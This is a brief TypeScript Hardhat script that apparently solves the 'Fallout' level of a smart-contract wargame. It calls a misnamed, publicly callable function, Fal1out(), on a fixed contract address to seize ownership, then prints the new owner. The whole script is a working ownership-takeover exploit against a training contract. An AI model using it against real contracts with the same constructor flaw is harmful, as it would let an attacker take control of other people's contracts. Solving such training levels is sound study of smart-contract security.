import { ethers } from "hardhat";
import { Fallout__factory } from "../typechain-types";

async function main() {
  // Claim ownership of the contract below to complete this level.

  let tx; // will have to wait for each tx
  let [deployer] = await ethers.getSigners();
  let contract = "0x9223f32d478BB579484149f9662436F3678aCE1C";
  let fallout = new Fallout__factory(deployer).attach(contract);

  tx = await fallout.Fal1out();
  await tx.wait();
  console.log(await fallout.owner());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
